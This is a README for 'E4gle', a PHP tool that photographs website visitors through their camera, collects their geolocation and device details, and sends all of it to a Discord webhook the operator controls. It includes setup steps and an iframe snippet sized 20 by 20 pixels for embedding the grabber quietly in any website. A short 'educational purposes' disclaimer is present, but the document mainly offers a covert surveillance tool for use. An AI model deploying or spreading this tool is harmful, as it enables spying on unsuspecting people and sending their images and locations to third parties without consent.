

# E4gle

E4gle is a PHP version of the R4ven project, designed to capture photos, location, and device details of users and send the collected data to a Discord webhook. This project can be hosted locally or integrated into any website for educational and testing purposes.

## Features

- Captures photos from the user's camera.
- Collects the user's geographical location.
- Gathers device details, including user agent and platform.
- Sends the captured data to a specified Discord webhook.

## How It Works

1. **Photo Capture:** The user's camera is accessed to take a photo.
2. **Location Collection:** The user's geographical coordinates are obtained using the Geolocation API.
3. **Device Details:** Information about the user's device is collected.
4. **Data Transmission:** The captured photo, location, and device details are sent to a Discord webhook.

## Requirements

- A web server with PHP support.
- A valid Discord webhook URL.

## Setup Instructions

### Local Hosting

1. **Download and Install XAMPP:**
   - [Download XAMPP](https://www.apachefriends.org/index.html)
   - Install XAMPP on your local machine.

2. **Clone the Repository:**
   ```sh
   git clone https://github.com/Onius365/E4gle.git
   ```

3. **Move Project to XAMPP:**
   - Move the cloned repository to the `htdocs` directory of your XAMPP installation.

4. **Start XAMPP:**
   - Open the XAMPP Control Panel.
   - Start the Apache server.

5. **Access the Project:**
   - Open your browser and go to `http://localhost/E4gle/index.php`.

### Web Hosting

1. **Upload Files:**
   - Upload the project files to your web server.

2. **Access the Project:**
   - Open your browser and go to your domain where the project is hosted.

### Integration into a Website

You can easily integrate E4gle into any website using an iframe. Add the following code to your HTML:

```html
<iframe src="https://yourdomain.com/e4gle/index.php" width="20" height="20"></iframe>
```

## Usage

1. Open the project in your browser.
2. Allow access to your camera and location when prompted.
3. The project will automatically capture a photo, collect location and device details, and send this data to the specified Discord webhook.

## Discord Webhook

To set up a Discord webhook:

1. Go to your Discord server.
2. Navigate to Server Settings > Integrations > Webhooks.
3. Create a new webhook and copy the URL.
4. Replace the webhook URL in the PHP script with your own.

## Security and Privacy

This project is intended for educational and testing purposes only. Ensure that users are informed and have given consent before capturing any data. Do not use this project for malicious activities.

## Contributing

Contributions are welcome! Feel free to fork the repository and submit pull requests.

## License

This project is licensed under the MIT License. See the LICENSE file for details.

---

This README should provide a clear and comprehensive overview of the E4gle project, with instructions for setup and usage.
